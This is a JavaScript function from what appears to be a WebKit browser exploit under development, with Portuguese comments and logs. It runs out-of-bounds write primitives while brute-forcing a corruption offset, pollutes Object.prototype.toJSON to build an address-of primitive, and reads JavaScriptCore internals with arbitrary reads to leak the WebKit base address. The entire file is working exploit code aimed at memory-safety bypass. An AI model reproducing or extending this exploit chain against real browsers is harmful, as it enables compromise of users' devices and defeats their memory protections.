// ATUALIZE APENAS ESTA FUNÇÃO em testArrayBufferVictimCrash.mjs

export async function executeCallFrameVictimAddrofAndWebKitLeak_R44() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_CALLFRAME_ADDROF_R44;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca Sistemática de Offset para CallFrame (R44.2) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R44.2...`;

    targetObjectForAddrof_R44 = function someUniqueLeakFunctionR44_Instance() { return `target_R44_${Date.now()}`; };
    logS3(`[R44.2] Função alvo para addrof recriada.`, 'info');

    // Fase 0: Sanity Check
    logS3(`--- Fase 0 (R44.2): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
    if (!coreOOBReadWriteOK) {
        logS3(`[R44.2] Sanity Check (selfTestOOBReadWrite): FALHA. Abortando.`, 'critical', FNAME_CURRENT_TEST_BASE);
        return { success: false, msg: "Core R/W primitives failed sanity check." };
    }
    logS3(`[R44.2] Sanity Check (selfTestOOBReadWrite): SUCESSO`, 'good', FNAME_CURRENT_TEST_BASE);
    
    let final_result = {
        success: false,
        addrof_success: false,
        webkit_leak_success: false,
        msg: "Busca de offset concluída. Nenhum offset funcional encontrado.",
        leaked_addr: null,
        webkit_base: null,
        successful_offset: null,
    };

    // NOVO: Loop de busca pelo offset correto
    const START_OFFSET = 0x40;
    const END_OFFSET = 0x100;
    const STEP = 0x8;

    for (let offset = START_OFFSET; offset <= END_OFFSET; offset += STEP) {
        logS3(`\n[R44.2] --- Tentando com offset de corrupção: ${toHex(offset)} ---`, 'subtest');
        
        // Resetar estado para cada tentativa
        leaked_address_from_callframe_R44 = null;
        addrof_probe_details_R44 = null;

        try {
            await triggerOOB_primitive({ force_reinit: true });

            // A função vítima agora usa o offset do loop
            async function victim_function_R44_loop(addrof_target) {
                const CRITICAL_WRITE_VALUE = 0xCACACACA;
                oob_write_absolute(offset, CRITICAL_WRITE_VALUE, 4); // Usa o offset do loop
                await PAUSE_S3(50);
                JSON.stringify({ p: { toJSON: new_addrOf_probe_R44 } });
                if (addrof_target) return 1;
                return 0;
            }

            // Poluir e executar
            const ppKey = 'toJSON';
            let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: new_addrOf_probe_R44, writable: true, configurable: true, enumerable: false });
                polluted = true;
                await victim_function_R44_loop(targetObjectForAddrof_R44);
            } finally {
                if (polluted) {
                    if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc);
                    else delete Object.prototype[ppKey];
                }
            }

            // Checar se esta iteração funcionou
            if (leaked_address_from_callframe_R44 && isAdvancedInt64Object(leaked_address_from_callframe_R44)) {
                logS3(`[R44.2] SUCESSO! Offset funcional encontrado: ${toHex(offset)}`, "vuln_major");
                final_result.addrof_success = true;
                final_result.leaked_addr = leaked_address_from_callframe_R44.toString(true);
                final_result.msg = `Addrof via CallFrame bem-sucedido no offset ${toHex(offset)}. Addr: ${final_result.leaked_addr}`;
                final_result.successful_offset = toHex(offset);

                // --- Se o addrof funcionou, tenta o WebKit Leak ---
                logS3(`--- Fase 2 (R44.2): Tentando vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
                const JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(0x0, 0x18);
                const JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(0x0, 0x8);
                const PAGE_MASK_4KB = new AdvancedInt64(0x0, ~0xFFF);

                try {
                    const ptr_to_executable_instance = await arb_read(leaked_address_from_callframe_R44, 8, JSC_FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE);
                    if (!isValidPointer(ptr_to_executable_instance, "executable_instance")) throw new Error("Ponteiro para ExecutableInstance inválido.");
                    
                    const ptr_to_jit_or_vm = await arb_read(ptr_to_executable_instance, 8, JSC_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM);
                    if (!isValidPointer(ptr_to_jit_or_vm, "jit_or_vm")) throw new Error("Ponteiro para JIT/VM inválido.");
                    
                    const webkit_base_candidate = ptr_to_jit_or_vm.and(PAGE_MASK_4KB);
                    final_result.webkit_leak_success = true;
                    final_result.webkit_base = webkit_base_candidate.toString(true);
                    final_result.msg += ` | WebKit Base Leak SUCESSO: ${final_result.webkit_base}`;
                    logS3(`[R44.2] SUCESSO na Fase 2 (WebKit Leak): Base candidata: ${final_result.webkit_base}`, "vuln");

                } catch (e_leak) {
                    final_result.msg += ` | WebKit Base Leak FALHOU: ${e_leak.message}`;
                    logS3(`[R44.2] ERRO na Fase 2 (WebKit Leak): ${e_leak.message}`, "error");
                }
                
                // Se encontramos um offset que funciona, podemos parar o loop.
                break; 
            } else {
                 logS3(`[R44.2] Offset ${toHex(offset)} não funcionou.`, 'debug');
            }

        } catch (e_main) {
            logS3(`Erro crítico na iteração do offset ${toHex(offset)}: ${e_main.message}`, "critical");
        } finally {
            await clearOOBEnvironment();
        }
    }
    
    final_result.success = final_result.addrof_success && final_result.webkit_leak_success;
    return final_result;
}
